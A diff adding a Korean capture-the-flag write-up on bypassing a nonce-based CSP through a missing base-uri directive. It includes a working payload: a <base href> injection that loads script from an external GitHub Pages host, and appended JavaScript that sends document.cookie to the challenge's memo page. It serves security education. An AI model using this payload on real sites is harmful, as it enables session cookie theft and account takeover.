@@ -121,8 +121,30 @@ app.run(host="0.0.0.0", port=8000)
 
 ## 문제 풀이
 ### 취약점 분석
-
+CSP 정책을 살펴보면 ```nonce``` CSP 구문을 지정했지만 ```base-uri``` CSP 구문을 지정하지 않아 ```base``` 태그로 임의 자원을 로드할 수 있는 취약점(Nonce Retargeting)이 존재함
+* ```<base>``` 태그의 ```href``` 속성을 이용해 외부 웹 서버로 경로가 해석되는 기준점을 변경하고, 이를 이용해 원하는 스크립트를 실행하게 만들 수 있음
+    - flag 페이지를 작동 방식을 보면 ```<svg onload=alert(1);>```를 입력한 후 제출 버튼을 누르고 출력된 "good" 알림창의 확인 버튼까지 누르고 나면 개발자 도구의 Network 탭을 통해 아래 js 파일들이 포함되는 것을 확인할 수 있음
+        + 이 점을 이용해 외부 웹 서버에 bootstrap.min.js를 생성하고 쿠키 정보를 이용할 수 있는 코드를 작성하여 익스플로잇을 수행할 수 있음
 
 <br/><br/>
 
 ### 익스플로잇
+📌 여기서는 Github에서 제공하는 웹 서버 호스팅 기능(```https://깃허브아이디.github.io/```)을 이용함 (그 외 다른 방법으로 개인 서버를 사용해도 가능함)
+
+<br/>
+
+1. 외부 웹 서버로 사용할 ```https://augustf86.github.io/```에서 static/js/boostrap.min.js를 아래와 같이 생성함
+    - 사이트에서 전송하던 bootstrap.min.js 파일을 복사하여 붙여넣기 한 후 아래에 다음을 추가함
+        ```javascript
+        var xmlHttp = new XMLHttpRequest();
+        var x = "http://127.0.0.1:8000/memo?memo=" + document.cookie;
+        xmlHttp.open('GET', x, true);
+        xmlHttp.send();
+        ```
+<br/>
+
+2. flag 페이지에서 ```<base href="https://augustf86.github.io/">```를 입력하고 제출 버튼울 클릭함
+
+<br/>
+
+3. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
